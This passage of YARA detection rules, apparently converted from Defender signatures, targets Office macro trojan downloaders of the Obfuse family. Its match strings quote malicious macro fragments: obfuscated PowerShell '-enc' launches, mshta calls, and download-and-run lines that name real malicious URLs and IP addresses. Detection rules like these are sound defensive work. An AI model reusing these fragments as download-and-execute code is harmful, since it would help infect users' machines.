        $x_1_3 = {4f 70 65 6e 20 [0-21] 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23}  //weight: 1, accuracy: Low
        $x_1_4 = ".Caption" ascii //weight: 1
        $x_1_5 = "\"Shell.Application\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JJ_2147742388_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JJ!MTB"
        threat_id = "2147742388"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "As String = \"p,:,\\,j,v,a,q,b,j,f,\\,f,l,f,g,r,z,3,2,\\,z,f,u,g,n,.,r,k,r," ascii //weight: 1
        $x_1_2 = "As String = \"P,:,\\,h,f,r,e,f,\\,c,h,o,y,v,p,\\,v,a,.,p,b,z," ascii //weight: 1
        $x_1_3 = "As String = \"P,:,\\,h,f,r,e,f,\\,c,h,o,y,v,p,\\,v,a,.,u,g,z,y," ascii //weight: 1
        $x_1_4 = {52 65 70 6c 61 63 65 28 [0-10] 2c 20 [0-10] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_5 = "frm.txt.text" ascii //weight: 1
        $x_1_6 = "Print #FileNumber, Spc" ascii //weight: 1
        $x_1_7 = {4d 69 64 24 28 [0-10] 2c 20 [0-10] 2c 20 31 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JJ_2147742388_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JJ!MTB"
        threat_id = "2147742388"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "As String = \"c&:&\\&w&i&n&d&o&w&s&\\&s&y&s&t&e&m&3&2&\\&m&s&h&t&a&.&e&x&e&" ascii //weight: 1
        $x_1_2 = "As String = \"C&:&\\&u&s&e&r&s&\\&p&u&b&l&i&c&\\&c&a&l&c&.&c&o&m&" ascii //weight: 1
        $x_1_3 = "As String = \"C&:&\\&u&s&e&r&s&\\&p&u&b&l&i&c&\\&i&n&.&h&t&m&l&" ascii //weight: 1
        $x_1_4 = {52 65 70 6c 61 63 65 28 [0-10] 2c 20 [0-10] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_5 = "frm.txt.text" ascii //weight: 1
        $x_1_6 = "Print #FileNumber, Spc" ascii //weight: 1
        $x_1_7 = {41 73 63 28 4d 69 64 24 28 [0-10] 2c 20 [0-10] 2c 20 31 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JJ_2147742388_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JJ!MTB"
        threat_id = "2147742388"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "As String = \"p,:,\\,j,v,a,q,b,j,f,\\,f,l,f,g,r,z,3,2,\\,z,f,u,g,n,.,r,k,r," ascii //weight: 1
        $x_1_2 = "As String = \"P,:,\\,h,f,r,e,f,\\,c,h,o,y,v,p,\\,v,a,.,p,b,z," ascii //weight: 1
        $x_1_3 = "As String = \"P,:,\\,h,f,r,e,f,\\,c,h,o,y,v,p,\\,v,a,.,u,g,z,y," ascii //weight: 1
        $x_1_4 = {52 65 70 6c 61 63 65 28 [0-10] 2c 20 [0-10] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_5 = "frm.txt.text" ascii //weight: 1
        $x_1_6 = "Print #FileNumber, Spc" ascii //weight: 1
        $x_1_7 = {4c 6f 6f 70 20 57 68 69 6c 65 20 [0-10] 20 3e 20 28 [0-10] 20 2d 20 31 29}  //weight: 1, accuracy: Low
        $x_1_8 = {41 73 63 28 4d 69 64 28 [0-10] 2c 20 [0-10] 2c 20 31 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JK_2147742415_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JK!MTB"
        threat_id = "2147742415"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "polaotos = \"p\"" ascii //weight: 1
        $x_1_2 = "poloots = \"h\"" ascii //weight: 1
        $x_1_3 = "hotguase = \"t\"" ascii //weight: 1
        $x_1_4 = "koasmxjw = \"s:/\"" ascii //weight: 1
        $x_1_5 = "kdjkeurg = \"/%909123id%909123id%909123id%909123id%909123id@j.mp\\kassaasdskdd" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JK_2147742415_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JK!MTB"
        threat_id = "2147742415"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "11"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "= \"cmd /c p^\" & \"o^\" & \"w^\" & \"e^\" & \"r^\" & \"s^\" & \"h^\" & \"e^\" & \"l^\" & \"l\" & \".\" & \"e\" & \"x\" & \"e\" & \" \"" ascii //weight: 10
        $x_1_2 = "= \" -e^\" & \"n^c \"" ascii //weight: 1
        $x_1_3 = "= \" -e\" & \"nc \"" ascii //weight: 1
        $x_1_4 = "= \" -enc \"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_JL_2147742416_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JL!MTB"
        threat_id = "2147742416"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".Open \"GET\", \"http://\" & \"104.244\" & \".74.243/pine\" & \".jpg\", False" ascii //weight: 1
        $x_1_2 = "(Environ(\"TMP\") + \"\\distanc1e.exe\")," ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JL_2147742416_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JL!MTB"
        threat_id = "2147742416"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "W\" + \"S\" + \"c\" + \"ript.Shell" ascii //weight: 1
        $x_1_2 = "StrReverse(\"\"\"d'*'kliiijjkijlilil'*'d'*'d\\p'*'.j\\\\:ptth\"\"\"\"aths'*'\"\"\")" ascii //weight: 1
        $x_1_3 = "Replace(WebUrl, \"'*'\", \"m\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JL_2147742416_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JL!MTB"
        threat_id = "2147742416"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "h5t7t2pf:2/0/3t9t0c5fav6.2c1oamc/cufn6b9bdmfe4vbdf/ad5726d.dp9hcp2?al9=1wcocz0m4b5l424.5caa5b2" ascii //weight: 1
        $x_1_2 = "StrConv(de266dbd, 64)" ascii //weight: 1
        $x_1_3 = "c7:b\\cp0rcodgbr0a8m0d7aft6aa\\a6945926f16.2j1p6ge" ascii //weight: 1
        $x_1_4 = "e7378c48 & Mid(dbddc9bc, ff16cb47, 1)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JL_2147742416_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JL!MTB"
        threat_id = "2147742416"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_3_1 = "h1t8tapb:b/3/6td0bb6l6mdm6u4.5c6o6m7/1i5z450/8y1acc2af.dpfh5p3?al7=et5zde41218.ccea5bf" ascii //weight: 3
        $x_3_2 = "h5tbt3p1:c/e/8tc04b1lbm5m6uf.cc1oam1/di5z154/4y0a3cca3.6p1hbpc?7l2=4t0z6e21f0c.2cea0b0" ascii //weight: 3
        $x_3_3 = "hbt2tfpb:5/5/2cdocffi23b.7c8o6m6/6i0z355/0y7afc9a5.0p4h9p9?1l6=akbp4tb93.8c6a6bb" ascii //weight: 3
        $x_2_4 = "c1:d\\5p1r2o6g0rba0m0daadtcaf\\9345e7c3a4c.bj8pcg9" ascii //weight: 2
        $x_2_5 = "cb:2\\7pbrao5g3rda4m1dcaft0a5\\8200a99934b.9j6p9g2" ascii //weight: 2
        $x_2_6 = "c3:d\\fp8r2o6gar4acm1ddadtba8\\b1c302c6a7b.3jbp1ge" ascii //weight: 2
        $x_1_7 = "CreateObject(\"WinHttp.WinHttpRequest.5.1\")" ascii //weight: 1
        $x_1_8 = {26 20 4d 69 64 28 [0-10] 2c 20 [0-10] 2c 20 31 29}  //weight: 1, accuracy: Low
        $x_1_9 = {53 74 72 43 6f 6e 76 28 [0-10] 2c 20 36 34 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_2_*) and 3 of ($x_1_*))) or
            ((3 of ($x_2_*) and 1 of ($x_1_*))) or
            ((1 of ($x_3_*) and 1 of ($x_2_*) and 2 of ($x_1_*))) or
            ((1 of ($x_3_*) and 2 of ($x_2_*))) or
            ((2 of ($x_3_*) and 1 of ($x_1_*))) or
            ((2 of ($x_3_*) and 1 of ($x_2_*))) or
            ((3 of ($x_3_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_JM_2147742417_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JM!MTB"
        threat_id = "2147742417"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_3_1 = {53 68 65 6c 6c 20 22 22 22 22 20 2b 20 22 22 20 2b 20 22 6d 73 22 20 2b 20 22 68 74 61 22 22 22 22 22 20 2b 20 22 68 74 74 70 73 22 20 2b 20 22 3a 5c 5c [0-20] 40 6a 2e 6d 70 5c [0-24] 22 22 22}  //weight: 3, accuracy: Low
        $x_1_2 = "Sub Auto_Open()" ascii //weight: 1
        $x_1_3 = "Sub calculator()" ascii //weight: 1
        $x_1_4 = "Sub Auto_Close()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_3_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_JM_2147742417_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JM!MTB"
        threat_id = "2147742417"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {4f 70 65 6e 28 22 47 45 54 22 2c 20 [0-10] 2c 20 46 61 6c 73 65 29}  //weight: 1, accuracy: Low
        $x_1_2 = {4d 69 64 28 [0-10] 2c 20 [0-10] 2c 20 31 29}  //weight: 1, accuracy: Low
        $x_1_3 = {53 74 72 43 6f 6e 76 28 [0-10] 2c 20 36 34 29}  //weight: 1, accuracy: Low
        $x_1_4 = {65 78 65 63 28 [0-10] 20 26 20 22 20 22 20 26 20 [0-10] 29}  //weight: 1, accuracy: Low
        $x_1_5 = {45 6e 76 69 72 6f 6e 28 22 74 6d 70 22 29 20 26 20 22 5c [0-10] 2e 6a 70 67 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JM_2147742417_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JM!MTB"
        threat_id = "2147742417"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {63 3a 5c 70 72 6f 67 72 61 6d 64 61 74 61 5c [0-8] 2e 22 20 26}  //weight: 1, accuracy: Low
        $x_1_2 = {53 74 72 43 6f 6e 76 28 [0-8] 2c 20 76 62 55 6e 69 63 6f 64 65}  //weight: 1, accuracy: Low
        $x_1_3 = {53 70 6c 69 74 28 [0-8] 2c 20 22 31 32 33 34 35 36 37 38 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {2e 65 78 65 63 20 28 [0-8] 29}  //weight: 1, accuracy: Low
        $x_1_5 = "CreateObject(\"wscript.shell\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JM_2147742417_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JM!MTB"
        threat_id = "2147742417"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {63 3a 5c 70 72 6f 67 72 61 6d 64 61 74 61 5c [0-8] 2e 22 20 26}  //weight: 1, accuracy: Low
        $x_1_2 = {53 74 72 43 6f 6e 76 28 [0-8] 2c 20 76 62 55 6e 69 63 6f 64 65}  //weight: 1, accuracy: Low
        $x_1_3 = {53 70 6c 69 74 28 [0-8] 2c 20 [0-8] 29}  //weight: 1, accuracy: Low
        $x_1_4 = {2e 65 78 65 63 20 28 [0-8] 29}  //weight: 1, accuracy: Low
        $x_1_5 = {41 73 20 53 74 72 69 6e 67 20 3d 20 22 63 3a 5c 70 72 6f 67 72 61 6d 64 61 74 61 5c [0-10] 2e 70 64 66 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JM_2147742417_4
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JM!MTB"
        threat_id = "2147742417"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_3_1 = {41 73 20 53 74 72 69 6e 67 20 3d 20 22 63 [0-2] 3a [0-2] 5c [0-2] 70 [0-2] 72 [0-2] 6f [0-2] 67 [0-2] 72 [0-2] 61 [0-2] 6d [0-2] 64 [0-2] 61 [0-2] 74 [0-2] 61 [0-2] 5c [0-15] 2e [0-2] 6a [0-2] 70 [0-2] 67 [0-2] 22}  //weight: 3, accuracy: Low
        $x_1_2 = {4d 69 64 28 [0-10] 2c 20 [0-10] 2c 20 31 29}  //weight: 1, accuracy: Low
        $x_1_3 = {53 74 72 43 6f 6e 76 28 [0-10] 2c 20 36 34 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JM_2147742417_5
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JM!MTB"
        threat_id = "2147742417"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_3_1 = {41 73 20 53 74 72 69 6e 67 20 3d 20 22 63 [0-2] 3a [0-2] 5c [0-2] 70 [0-2] 72 [0-2] 6f [0-2] 67 [0-2] 72 [0-2] 61 [0-2] 6d [0-2] 64 [0-2] 61 [0-2] 74 [0-2] 61 [0-2] 5c [0-15] 2e [0-2] 6a [0-2] 70 [0-2] 67 [0-2] 22}  //weight: 3, accuracy: Low
        $x_1_2 = "CreateObject(\"WinHttp.WinHttpRequest.5.1\")" ascii //weight: 1
        $x_1_3 = {26 20 4d 69 64 28 [0-10] 2c 20 [0-10] 2c 20 31 29}  //weight: 1, accuracy: Low
        $x_1_4 = {53 74 72 43 6f 6e 76 28 [0-10] 2c 20 36 34 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_3_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_JM_2147742417_6
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JM!MTB"
        threat_id = "2147742417"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_3_1 = {2e 65 78 65 63 20 [0-10] 20 26 20 22 20 22 20 26 20 [0-10] 28 22 63 [0-2] 3a [0-2] 5c [0-2] 70 [0-2] 72 [0-2] 6f [0-2] 67 [0-2] 72 [0-2] 61 [0-2] 6d [0-2] 64 [0-2] 61 [0-2] 74 [0-2] 61 [0-2] 5c [0-15] 2e [0-2] 6a [0-2] 70 [0-2] 67 [0-2] 22 29}  //weight: 3, accuracy: Low
        $x_1_2 = "CreateObject(\"WinHttp.WinHttpRequest.5.1\")" ascii //weight: 1
        $x_1_3 = {26 20 4d 69 64 28 [0-10] 2c 20 [0-10] 2c 20 31 29}  //weight: 1, accuracy: Low
        $x_1_4 = {53 74 72 43 6f 6e 76 28 [0-10] 2c 20 36 34 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_3_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_JM_2147742417_7
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JM!MTB"
        threat_id = "2147742417"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {63 3a 5c 70 72 6f 67 72 61 6d 64 61 74 61 5c [0-8] 2e 22 20 26}  //weight: 1, accuracy: Low
        $x_1_2 = {53 74 72 43 6f 6e 76 28 [0-8] 2c 20 76 62 55 6e 69 63 6f 64 65}  //weight: 1, accuracy: Low
        $x_1_3 = {53 70 6c 69 74 28 [0-8] 2c 20 [0-8] 29}  //weight: 1, accuracy: Low
        $x_1_4 = {2e 65 78 65 63 20 28 [0-8] 29}  //weight: 1, accuracy: Low
        $x_1_5 = "CreateObject(\"wscript.shell\")" ascii //weight: 1
        $x_1_6 = "32 test.pdf" ascii //weight: 1
        $x_1_7 = {41 73 20 53 74 72 69 6e 67 20 3d 20 22 [0-10] 2e 70 64 66 22 29}  //weight: 1, accuracy: Low
        $x_1_8 = {41 73 20 53 74 72 69 6e 67 20 3d 20 22 63 3a 5c 70 72 6f 67 72 61 6d 64 61 74 61 5c [0-10] 2e 70 64 66 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (6 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JM_2147742417_8
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JM!MTB"
        threat_id = "2147742417"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {72 33 32 20 63 3a 5c 70 72 6f 67 72 61 6d 64 61 74 61 5c [0-8] 2e 70 64 66 22}  //weight: 2, accuracy: Low
        $x_2_2 = {72 33 32 20 63 3a 5c 70 72 6f 67 72 61 6d 64 61 74 61 5c [0-8] 2e 74 78 74 22}  //weight: 2, accuracy: Low
        $x_2_3 = {72 33 32 20 63 3a 5c 75 73 65 72 73 5c 70 75 62 6c 69 63 5c [0-8] 2e 74 78 74 22}  //weight: 2, accuracy: Low
        $x_2_4 = {41 73 20 53 74 72 69 6e 67 20 3d 20 22 63 3a 5c 70 72 6f 67 72 61 6d 64 61 74 61 5c [0-10] 2e 70 64 66 22}  //weight: 2, accuracy: Low
        $x_2_5 = {41 73 20 53 74 72 69 6e 67 20 3d 20 22 63 3a 5c 70 72 6f 67 72 61 6d 64 61 74 61 5c [0-10] 2e 74 78 74 22}  //weight: 2, accuracy: Low
        $x_2_6 = {41 73 20 53 74 72 69 6e 67 20 3d 20 22 63 3a 5c 75 73 65 72 73 5c 70 75 62 6c 69 63 5c [0-10] 2e 74 78 74 22}  //weight: 2, accuracy: Low
        $x_1_7 = {53 70 6c 69 74 28 [0-8] 2c 20 [0-8] 29}  //weight: 1, accuracy: Low
        $x_1_8 = {2e 65 78 65 63 28 [0-8] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_2_*) and 2 of ($x_1_*))) or
            ((3 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_JM_2147742417_9
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JM!MTB"
        threat_id = "2147742417"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "CreateObject(\"Scripting.FileSystemObject\")" ascii //weight: 1
        $x_1_2 = {43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 22 43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c [0-25] 22 2c 20 54 72 75 65 29}  //weight: 1, accuracy: Low
        $x_1_3 = {57 72 69 74 65 4c 69 6e 65 20 28 22 [0-25] 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = "Application.Quit SaveChanges:=False" ascii //weight: 1
        $x_1_5 = {43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 [0-40] 2e 44 65 66 61 75 6c 74 54 61 72 67 65 74 46 72 61 6d 65 2c 20 54 72 75 65 29}  //weight: 1, accuracy: Low
        $x_1_6 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-40] 2e 54 61 67 29}  //weight: 1, accuracy: Low
        $x_1_7 = {45 78 65 63 20 22 65 78 70 6c 6f 72 65 72 2e 65 78 65 20 22 20 26 20 [0-40] 2e 44 65 66 61 75 6c 74 54 61 72 67 65 74 46 72 61 6d 65}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JN_2147742430_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JN!MTB"
        threat_id = "2147742430"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "https://scjtt.fr/pdf/test.exe" ascii //weight: 1
        $x_1_2 = "C:\\Users\\\" & Environ(\"UserName\") & \"\\Downloads\\battery.exe" ascii //weight: 1
        $x_1_3 = "Shell(DestinationFile, 1)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JN_2147742430_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JN!MTB"
        threat_id = "2147742430"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \"S\" & \"h\" & \"e\" & \"l\" & \"l\"" ascii //weight: 1
        $x_1_2 = "= \"W\" & \"S\" & \"c\" & \"r\" & \"i\" & \"p\" & \"t\"" ascii //weight: 1
        $x_1_3 = "= \" -e^\" & \"n^c \"" ascii //weight: 1
        $x_1_4 = "= \"  -enc \"" ascii //weight: 1
        $x_1_5 = "= VBA.CreateObject(" ascii //weight: 1
        $x_1_6 = {2e 52 75 6e 28 [0-9] 2c 20 30 2c 20 46 61 6c 73 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JN_2147742430_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JN!MTB"
        threat_id = "2147742430"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "WinHttpReq.Open \"GET\", myURL, False, \"username\", \"password\"" ascii //weight: 1
        $x_1_2 = "http://192.168.100.5/testdata.txt" ascii //weight: 1
        $x_1_3 = "SaveToFile \"C:\\Users\\Enigma\\source\\repos\\02rev\\mytest.txt\", 2 ' 1" ascii //weight: 1
        $x_1_4 = "PowerShell -Command \"\"{Invoke-WebRequest -Uri http://192.168.100.5/testdata.txt -OutFile" ascii //weight: 1
